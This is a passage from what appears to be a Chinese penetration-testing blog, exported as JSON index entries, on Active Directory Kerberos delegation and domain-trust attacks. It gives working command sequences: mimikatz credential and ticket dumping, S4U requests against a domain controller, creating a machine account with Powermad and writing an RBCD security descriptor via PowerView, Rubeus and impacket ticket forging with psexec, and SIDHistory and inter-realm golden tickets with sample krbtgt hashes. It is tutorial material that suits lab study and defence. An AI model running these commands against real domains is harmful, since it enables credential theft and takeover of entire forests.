约束委派的利用 3.2.2.1 常见情况 已知在约束委派的情况下，服务用户只能获取某个用户或者主机的服务 ST，只能用模拟用户访问特定的服务，是无法获取用户的 TGT 的，如果能够获得到开启了约束委派的服务的用户的明文密码或者 hash 就可以伪造 S4U 的请求，进而伪造服务用户以任意账户的权限访问服务的 ST。 先抓出主机账户的 NTLM Hash 值： mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" exit 申请 TGT： 信息 如果拥有服务用户登录的主机权限，可以用 mimikatz 直接从内存中把服务用户的 TGT dump 出来，可以跳过申请 TGT 这个步骤，直接用 mimikatz 导出 TGT： mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit NTLM Hash 和密码都可以： tgt::ask /user:win7$ /domain:pentest.com /ntlm:\u003c抓取到的哈希\u003e tgt::ask /user:win7$ /domain:pentest.com /password:12345 通过 TGT，请求一张以 Administrator 用户身份访问对应服务 2（DC 的 cifs 服务）的 ST：tgs::s4u /tgt:TGT_win7$@PENTEST.COM_krbtgt~pentest.com@PENTEST.COM.kirbi /user:administrator@pentest.com /service:cifs/dc.pentest.com S4U2Self 获取到的 ST1 以及 S4U2Proxy 获取到的 DC CIFS 服务的 ST2 会保存在当前目录下： 用 mimikatz 将 ST2 导入当前会话即可： kerberos::ptt TGS_administrator@pentest.com@PENTEST.COM_cifs~dc.pentest.com@PENTEST.COM.kirbi 3.2.2.2 SPN 设置影响对应票据 当委派的权限不是 cifs 时，如 time 权限，如何进一步测试？ 通过在 hex 模式下修改 ST2，将 time 修改为 cifs，即可通过 smbexec 执行命令。 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:3:2","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"4 基于资源的约束委派 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:4:0","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"4.1 原理 上文的约束委派中提到，如果配置受约束的委派，必须拥有 SeEnableDelegation 特权，该特权是敏感的，通常仅授予域管理员。为了使用户/资源更加独立，Windows Server 2012 中引入了基于资源的约束委派。基于资源的约束委派(RBCD)配置在后端目标服务或资源上(例如后端的 CIFS 服务)，而不是在前端的服务或资源上(例如前端的 WEB 等)。基于资源的约束委派允许资源配置受信任的帐户委派给他们。 基于资源的约束委派和传统的约束委派非常相似，但是作用的方向实际上是相反的。 传统的约束委派：在 ServiceA 的 msDS-AllowedToDelegateTo 属性中配置了对 ServiceB 的信任关系，定义了到 ServiceB 的传出委派信任。传统的约束委派 S4U2Self 返回的票据一定是可转发的，如果不可转发那么 S4U2Proxy 将失败；但是基于资源的约束委派不同，就算 S4U2Self 返回的票据不可转发（可不可以转发由 TrustedToAuthenticationForDelegation 决定），S4U2Proxy 也是可以成功，并且 S4U2Proxy 返回的票据总是可转发。 资源约束委派：在 ServiceB 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中配置了对 ServiceA 的信任关系，定义了从 ServiceA 的传入信任关系。资源本身可以为自己配置资源委派信任关系，资源本身决定可以信任谁，该信任谁。 利用条件：简单来说就是你获得的用户对该主机的属性具有写权限，那么这个用户就可以对该主机进行攻击。 相信此时大家应该明白了**基于资源的约束委派(RBCD)**的认证流程。怎么来设置基于资源的约束委派呢？其中 msDS-AllowedToActOnBehalfOfOtherIdentity 是关键。 首先我们来思考一个问题：**“谁有权限能修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值呢?” ** 分析环境如下： 角色 用户 系统 域内普通机器 Redteam\\web3user Win 2012 域控机器 Redteam\\administrator Win 2012 查询 web3 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性发现默认是不存在的。 由此得知所有加入域的机器默认不存在这个属性，需要手动添加才行。 那么谁有权限能修改 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值的问题就变成了谁有权限添加 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。 经过查询，以下两个用户具有该权限： REDTEAM\\web3user -\u003e WriteProperty NT AUTHORITY\\SELF -\u003e WriteProperty 为什么 REDTEAM\\web3user 拥有 WriteProperty 权限呢？当 web3 计算机通过域用户 web3user 加入域时，域内会创建名为 web3.redteam.com 的计算机对象，而创建者就是 web3user，所以该域用户具有对 web3.redteam.com 的 WriteProperty 权限。 ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:4:1","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"4.2 实战 攻击流程： 假设开启基于资源的约束性委派机器为 A 首先要有一个对当前计算机有写权限的账户，才能对 A 设置可以被委派访问的服务账户。 利用当前账户创建一个机器账户，并配置好机器账户到 A 的基于资源的约束性委派 因为机器账户是我们创建的，我们知道它的密码账户，可以让它利用 S4U2SELF 协议获得一个不可转发 ST。然后用这个不可转发 ST 通过 S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问 A cifs 服务的 ST2。 用 ST2 访问 A 的 CIFS 服务，获得权限。 4.2.1 环境模拟 首先要查找域中的某个域用户对目标机器的属性有写权限，在此处手动添加一个用户，以模拟该权限： 直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。 4.2.2 寻找对目标主机账户有完全控制权限的用户 利用 powerview 查看当前用户 SID，并查看当前用户对某台主机是否有写权限 # 查看 SID Get-DomainUser -Identity [userName] -Properties objectsid # 查看写权限 Get-DomainObjectAcl -Identity [computerName] | ?{$_.SecurityIdentifier -match \"SID\"} 如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。 4.2.3 创建机器账号 现在还需要的是一个具有 SPN 的账户，因为 S4U2Self 只适用于具有 SPN 的账户，恰好的是在域中有一个属性 MachineAccountQuota，这个值表示的是允许用户在域中创建的计算机帐户数，默认为 10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册 RestrictedKrbHost/domain 和 HOST/domain 这两个 SPN 的，所以这里刚好符合我们的意图。 可以使用 Powermad 中的 New-MachineAccount 来创建一个用户名为 evilsystem，密码为 evil 的计算机账户 https://github.com/Kevin-Robertson/Powermad Import-Module .\\Powermad.ps1 New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString \"testObject\" -AsPlainText -Force) 添加了一个密码 testObject，名为 hacksystem 的机器账户，接下来就是配置 hacksystem 到 WIN7 的委派了。我们需要做的，是修改 WIN7 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值 ，这个操作我们用 powerview 实现。 # 这里的 sid -\u003e S-1-5-21-3298638106-3321833000-1571791979-1112 # 是我们创建的 机器用户 evilsystem 的 sid，在 powerview 下用 Get-Domiancomputer hacksystem # 获取 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer [目标主机名]| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose 验证是否成功添加： Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity 配置完 msDS-AllowedToActOnBehalfOfOtherIdentity 属性之后就可以通过基于资源的约束委派去攻击目标主机了 4.2.4 攻击 攻击路径：user -\u003e evil -\u003e target 本地导出机器用户的 ntlm hash： Rubeus.exe hash /user:evilsystem /password:testObject /domain:xxx 然后用 evilsystem$ 的 hash 请求白银票据并导入到当前会话中： Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdsspn:cifs/dc /ptt Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdsspn:host/dc /ptt 4.2.5 注意事项 Rubeus 申请的票据和 impacket 申请的缓存票据有差别，测试时使用 Psexec 返回一个 shell 失败，需要再申请一个 HOST 票据。 impacket getST.py -dc-ip IP -spn cifs/target -impersonate administrator pentest.com/evilsystem$:evil set KRB5CCNAME=administrator.ccache python psexec.py -nopass -k target # 或者利用 mimikatz 导入票据 mimikatz.exe \"privilege::debug\" \"kerberos::ptc administrator.ccache\" Psexec.exe \\\\target -s cmd 4.2.6 解决敏感账户不能委派 利用条件：知道目标的主机账户的凭证 注： 一般情况下主机在加入域中会随机设置主机账户的密码，所以一般情况下用的是主机账户 hash，并且不能修改主机账户的密码，否则该主机就会和域失去信任。 在域环境中，高权限用户如果没有特殊需求的情况下，考虑到安全性一般是设置为不可委派，或者是加入受保护组 在以 administrator 账户身份进行 S4U 时，只能进行 S4U2SELF，不能进行S4U2PROXY。 用 Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/target /ptt继续实验 administrator，发现确实是这样 解密 base64 后的票据： rubeus.exe describe /ticker:S4Ubase64 doIFxxxxxxx 发现 SPN 并没有指定服务 利用 Rubeus 完成票据修改： rubeus.exe tgssub /ticket:base64EncodeTicket /altservice:cifs/test1 /ptt 修改后导入内存即可。 参考： http://www.const27.com/2020/10/12/域委派攻击/ https://eviladan0s.github.io/2020/04/14/kerberos-delegation/ https://xz.aliyun.com/t/7217 https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj553400(v=ws.11) https://daiker.gitbook.io/windows-protocol/kerberos/2#0x05-wei-pai https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:4:2","tags":["域安全","内网渗透","域委派"],"title":"基于域委派的攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"基于域信任关系的域攻击原理及实验","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"基于域信任关系的域攻击 ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:0:0","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"域信任 建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的管理和维护。这种模式在带来便利的同时，也存在很多可以被恶意攻击者利用的地方。 域信任关系可以是单向\\双向信任、可传递\\不可传递信任、内部\\外部信任、跨域链接信任(cross link trust)等类型。例如，2 个域之间有单向可传递的外部信任关系。同一个森林(Forest)内部的域信任关系，一般隐含为双向可传递的内部信任关系。 部署： 父子信任关系是最常见的域信任关系，在同一个森林内部，加入一个新域时，最常见的是子域模式(Parent- Child)，或者是树根模式(Tree-Root)，这两种模式分别会建立父子信任\\树根信任关系，都是双向可传递的内部信任关系。 跨域链接信任(cross link)，指的是在同一个森林的两个子域间建立直接的信任关系。因为在同一个森林中，域的组织关系是树状结构，从一个子域到另外一个域，需要从树枝的子域顺寻到根域(Forest Root)，然后从根域继续顺寻到另外一个子域，而跨域链接相当于 在 2 个子域之间之间建立了一个快捷方式的信任关系，以减少认证和授权的时间和步骤。 内部信任指的是森林内部域之间的信任关系。相应地，外部信任(External Domain Trust)指的是域和所在森林之外的域之间的信任关系。 还有一种 MIT 信任(Kerberos 协议及标准由 MIT 提出)，是 Windows 域与非 Windows 域之间的信任关系，由于应用较少，本文不讨论此种类型的域信任关系。 ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:1:0","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"跨域认证和资源访问授权 当 2 个域之间建立域信任关系时，会建立共享的域间密钥(Inter-Realm Key，简写为IRKey)，其作用相当于 Krbtgt，只不过 IRKey 用于相互信任的 2 个域之间的认 证，而 Krbtgt 用于同一个域服务器的 AC 和 KDC 之间的认证。 信任域之间的认证授权过程，与同一个域中的认证授权大抵相似，但仍然有不少区别。 Jack 向 DC1 发起认证请求，数据由 Jack 的口令 NTLM 值加密; DC1 使用 Jack 的口令 NTLM 值验证收到的认证请求，返回一个通过认证的 TGT 票据给 Jack; Jack 使用 TGT 票据，向 DC1 发起授权请求，发起 请求访问 DC2 中文件服务的 TGS_REQ; DC1 检查到文件服务在 DC2 中，返回一个可转投的 TGT(Referral TGT)，指明需转投到 DC2，使用 IRKey 加密可转投 TGT 中的认证信息; Jack 收到可转投的 TGT 后，根据提示信息，使用转投 TGT，发起访问 DC2 中文件服务的请求 TGS_REQ; DC2 收到请求后，使用 IRKey 验证可转投 TGT 中的认证信息，返回一个允许访问文件服务的 TGS 票据，票据中部分信息使用运行文件服务的服务账号的口令 NTLM 值加密; Jack 使用收到的 TGS 票据访问 DC2 中的文件服务; 文件服务的服务账号使用口令 NTLM 值校验 TGS 当 2 个域之间建立信任关系时，会在全局域数据库中存档对方的 SPN、DNS 等信息，方便访问时进行查询。例如，上图中，DC1 会存档 DC2 中所有的服务 SPN、DNS 等信息。 如果 Jack 请求访问的服务在 DC1 的全局数据库中，则会返回转投 TGT，如果不在，如果 DC1 有父域，则 DC1 会向父域请求直至森林的根域服务器，如果 DC1 本身是根服务器(本例中 DC1 是根域服务器)，则直接告诉 Jack，请求访问的服务不存在。 一个森林只有一个全局数据库。 ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:2:0","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"SIDHistory 版跨域黄金票据 在一个域中，一旦我们获取 Krbtgt 的 NTLM 值，则可以构造黄金票据，伪造成域内任意用户，包括管理员，获取对域的完全访问控制权限。但是在同一个森林的不同域中，黄金票据不再有效。 回顾一下黄金票据的几大要素，即域名、域的SID(Security Identifier)、本域 Krbtgt 用户口令 NTLM 值、想伪造票据的用户 RID(Relative Identifier，在无特别指明情况下，Mimikatz 工具会设置 RID 为域管理员的 RID)。不同的域有不同的 Krbtgt，导致黄金票据在不同的域之间失效。 mimikatz.exe \"kerberos::golden /user:anyusername /domain:lab.adsec.com /sid:S-1-5-21-2732272027-1570987391-2638982533 /krbtgt:16ed27ee7848756cfa96b33c25e3ad3d /ptt\" exit 不同的域有不同的 Krbtgt，导致黄金票据在不同的域之间失效。 可以看到，在构造 lab.adsec.com 域的黄金票据时，在本域中有效，到父级域 adsec.com 中票据失效。 如果一个用户的 SIDHistory 属性被设置为高权限组或者用户的 ID，则该用户也具备等同于高权限组或者用户的权限。如果我们伪造的黄金票据中加入目标域的域管理员组的 SID，则可以获取目标域的域管理员权限，黄金票据和 SIDHistory 的结合，可实现跨域黄金票据。 由于每个域的 SID 都不同，叠加 SIDHistory 的黄金票据不具备通用性。根据微软的描述，在同一个域森林内部，企业管理组 EA(Enterprise Administrators) 会自动被森林内部所有域加入到本域的域管理员组，且 EA 只存在于根域中，所以企业管理组 EA 的 SID 固定为根域的 SID 加上固定的 RID 即 519。 因此，如果将使用企业管理组 EA 的 SID 设置 SIDHistory 属性，和黄金票据结合，则在只获取任意一个域 krbtgt 账号 NTLM 值的前提下，可实现森林内部所有域的跨域黄金票据，这种票据可简称为 SIDHistory 版黄金票据。 当然也可以添加森林内某个指定域的管理员组 SID 为 SIDHistory，但是这样的黄金票据只对该指定域有效，对其他域无效。不如使用企业管理员 SID 的票据那样有通用性。 mimikatz.exe \"kerberos::golden /user:anyusername sids:[EA组的sid] /sid:[lab.adsec.com域的sid] /domain:lab.adsec.com /krbtgt:16ed27ee7848756cfa96b33c25e3ad3d /ptt\" exit 仍然在 lab.adsec.com 域中构造黄金票据，但添加了 SIDS 参数，使用根域的企业管理员 SID 作为参数值，即 SIDHistory 版黄金票据，对 lab.adsec.com 和 adsec.com 域均有效。 这里需要注意的是，实现 SIDHistory 版黄金票据的基础是森林内信任关系，因为如果不是森林内信任关系，则 SIDHistory 会被微软的 SID Filter 规则过滤掉，从而失效，但森林内部不会有 SID Filter 规则。这也是为什么说是森林而非域才是安全边界。 ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:3:0","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"IRKey 版跨域黄金票据 当 2 个域之间建立域信任关系时，需要建立共享的域间密钥(Inter-Realm Key，简写为 IRKey)，其作用相当于 Krbtgt，只不过是用于相互信任的 2 个域之间，而 Krbtgt 用于同一个域服务器的 AC 和 KDC 之间。 只要获取森林内部任意域的 krbtgt 账号的 NTLM 值，则通过 SIDHistory 版黄金票据，即可获取全森林所有域的控制权。因此为了防御，必须 2 次修改森林内部所有域的 krbtgt 账号的 NTLM 值。 在多域环境中，IRKey 和主机账号类似，系统默认每 30 天自动修改一次 NTLM。所以即使 2 次修改森林内所有域的 krbtgt 账号的 NTLM，IRKey 的 NTLM 大概率仍然没有发生改变(小概率是 krbtgt 的 NTLM 修改正好碰上了 IRKey 的修改周期)。 类似白银票据，可以使用 IRKey 伪造域间可转投票据(Inter-Realm Referral TGT)，获取目标域的域管理员权限，再结合上一节的 SIDHistory 版黄金票据，再次获取整个森林的控制权。这里需要注意的是 SID 为目标域的 SID。 在域中，大部分带 ‘$’ 符号的账号为 Computer 账号，但是 User 组带 ‘$’ 符号的账号为信任账号，可以通过域服务器自带的 Powershell 命令 Get-ADUser 获取所有 带 ‘$’ 符号的 User 账号，下图中 ADSEC$ 账号为信任账号，隶属于 Users 组。 有 2 种方式可以获取信任账号的 NTLM 值。 ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:4:0","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"Dcsync 获取信任账号的 NTLM 值 下图采用 Dcsync 方式，获取 lab.adsec.com 域中信任账号 adsec$ 的 NTLM 值，结果表明该账号的类型为 TRUST_ACCOUNT ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:4:1","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"lsadum 获取信任账号的 NTLM 值 采用 lsadump::trust /patch方式。从下图中可看到有 [IN] LAB.ADSEC.COM -\u003e ADSEC.COM 和 [OUT] ADSEC.COM -\u003e LAB.ADSEC.COM 两种不同的 NTLM 值，分别是往外到其他域和往内到本域访问时用到的值。因为双向信任关系其实是 2 个单向信任关系的叠加，所以会有 2 个密钥。这里我们要从本域构造 IRKey 版黄金票据访问森林内部其他域，所以使用 IN 这个 NTLM 值。 由于 IRKey 存在于森林内部的信任域之间，也存在于森林外部的森林之间，均可用于转投认证。在 SIDHistory 版黄金票据中，由于 SID Filter 规则，在森林之间不能使用，但是 IRKey 版不涉及这个安全过滤规则，仍然有效。IRKey 版黄金票据可以分作森林内部的、森林外部的 2 种，操作方法类似，这里我们着重介绍森林内部的 IRKey 版黄金票据。 域间转投票据的认证，依靠 IRKey 加密。在我们已知 IRKey 的前提下，可以伪造持有该 IRKey 的信任域的任意用户。测试中，我们构造一个票据，告诉 adsec.com 域，转投认证的用户为 administrator，而且 SIDHistory 为根域的企业管理员。 构造成功后，具备 adsec.com 的管理员权限，但是不能高权限访问 lab.adsec.com，因为构造的票据是到 adsec.com 域的管理员票据。在获取 adsec.com 域的高权限后，可以获取该域的 krbtgt 账号的 NTLM 值，在此基础上，继续构造 SIDHistory 版黄金票据，从而可以获取整个森林的控制权。 ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:4:2","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"域信任关系的获取 在大型域网络中，因为公司并购、企业重组、业务扩展等各种原因，域网络的组织模式、信任关系各有不同。这些不同的信任关系，均存放在森林根域的数据库中(Global Catalog)，有多种方式可以获取这些数据 PowerView、BloodHound 工具分别提供了多种获取域信任关系的方式，且能可视化信任关系。下面将介绍从森林内部的某个子域的主机，获取整个森林信任关系的方法和过程。 Powerview: 先使用 Get-NetForestTrust 命令获取森林级别的信任关系，共有 2 个森林，分别为 adsec.com、testlab.com，2 个森林建立了双向信任关系 使用 Get-NetDomainTrust 命令获取 adsec.com 域的域级别信任关系，即森林内部关系，有到 lab.adsec.com 的 ParentChild 信任关系和到 res.com 域的 TreeRoot 两种森林内部关系。 测试中，Get-NetDomainTrust 的参数 adsec.com 表示查询指定域上的信任关系，一般情况下，只要指定的域信任当前查询主机所在的域，就可以获取对方的信任关系数据。 在查询时可以使用 Export-CSV -NoTypeInformation 将输出结果转换为 CSV 格式，命令为 Get-DomainTrustMapping -API | Export-CSV -NoTypeInformation trusts-mapping.csv。然后使用 TrustVisualizer 工具进行可视化输出。最后使用 yED 工具转换为可视化图形。 ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:5:0","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"利用域信任实现跨域攻击 如果一个域内用户(假设用户为 eviluser)想访问其他域的资源访问，首先确保目标域信任当前用户所在的域，这是基本前提，然后必须具备以下3个条件之一 eviluser 被目标域加入了某个组，这个组在目标域中具有资源访问权限; eviluser 被目标域中的某些主机或服务器添加为本地组，例如被某台服务器添加为本地管理员组; 当前用户被目标域的某些域对象添加为访问控制 ACL 的安全主体(Security Principal)，例如可以修改某个域用户对象的口令 也许有人疑问，根据前面介绍的内容，既然只要获取了当前域的 Krbtgt 账号或者 IRKey 账号的 NTLM 值， 即可获取整个森林的控制权，那没有必要再介绍森林内部的跨域攻击 这是因为在实际情况中，并不一定能顺利获取某个域的 Krbtgt 账号或者 IRKey 账号的 NTLM 值，例如域资源少、配置严谨、系统更新及时等，这时需要绕道至更大的域，才有更多的机会获取 Krbtgt 账号或者 IRKey 账号的 NTLM 值，因为资源越多，存在脆弱点的概率越大 要实现从当前用户 eviluser 开始，跨域攻击 A 域，首先得确保当前用户具备跨域访问 A 域资源的权限，所以攻击环节应该包括几个步骤 从当前域的数据库中，枚举有哪些域信任当前域 (出)，由于是攻击其他域，所以不用关注当前域信任哪些外部域(入)，这从上一节介绍的方法可以轻松获取 利用信任关系，枚举目标域中哪些组包含外来域的用户。这里需要特别解释一点的是，在域内通常有 3 种 类型的组，第 1 种是域本地组(Domain Local Groups)，可以添加跨域、跨森林的组成员，也是最常见的组；第 2 种是全局组(Global Groups)，不允许有任何跨域组成员，即使是同一个森林也不可以，权限较高，例如企业管理组；第 3 种是通用组(Universal Groups)，可以添加森林内的任何成员，但是跨森林的不可以。在森林内部的跨域攻击中，我们只关注第一、三种域内组。一个用户的 memberof 属性由组的 member 属性计算 而来，前提是组的 member 属性已经更新到全局目录数据库中(Global Catalog)。如果一个用户被森林中另外一个域添加为通用组成员，通用组将 member 属性更新到森林的全局目录数据库中，用户的 memberof 属性会通过计算被更新; 一个用户被森林中另外一个域添加为域本地组成员时，由于域本地组不会更新 memberof 属性到全局目录数据库中，因此用户的 memberof 属性也不会被计算更新。所以，即使我们有权限查询森林的全局目录数据库，也只能得到被添加到其他域通用组的成员属性，要想获得加入其他域域本地组的成员属性，需要逐个轮询所有的域 枚举目标域中主机\\服务器的本地组，查看哪些外来用户被加入到主机\\服务器的本地组，可以通过 GPO 组策略进行枚举，也可以通过 PowerView 逐个探测，当然 BloodHood 自动化的全部探测。 枚举目标域内对象的 ACL，检查是否有包含外来域用户的域对象 ACL。一般而言，任意用户均可查看所有域内对象的 ACL，同时全局数据库中保存了所有域对象的 ACL，可以很方便的枚举。PowerView 提供了 Get-DomainObjectACL 命令，可方便枚举 对第 2、3、4 步筛选出的用户做第二次筛选，筛选出属于当前域的用户，作为在当前域中的攻击对象，例如获取目标用户的 NTLM 值或者 TGT 票据，本域的攻击方法。 利用第 3 步攻击获取的用户 NTLM 值或者 TGT 票据 进行跨域访问，进入目标域，然后攻击获取目标域的 Krbtgt 账号或者 IRKey 账号的 NTLM 值，如果条件不成熟，继续上面的步骤，逐步进入更多的域中寻找机会。当一个用户被森林外部域加入某个组时，会出现在外部目标域的 CN=ForeignSecurityPrincipals,DC=domain,DC=com 组中，相当于用户在外部域中的代表或者别名，而且域中的所有外来用户具备相同的 SID，这是跨森林的 SID 过滤安全机制的效果。 所以只要枚举 ForeignSecurityPrincipals 组，就可得知哪些用户具有这个外部森林的访问权限，假设用户结果集合为 ExternalUsers。接下来，先查看是否包含我们当前所在域的用户，如果有，则直接攻击这些用户获取 NTLM 值或者 TGT 票据，从而获取森林外部域的资源访问权限 如果没有，则查看 ExternalUsers 是否包含我们当前所在森林的用户，假设结果合集为 InternalUsers。在当前森林中查询定位 InternalUsers 所在的域。以这些域为目标，使用森林内部的跨域攻击方法，攻击这些域，获取进入这些域的权限，再从这些域中攻击 InternalUsers 中的用户，从而获取外部域的资源访问权限，这是一种绕道攻击 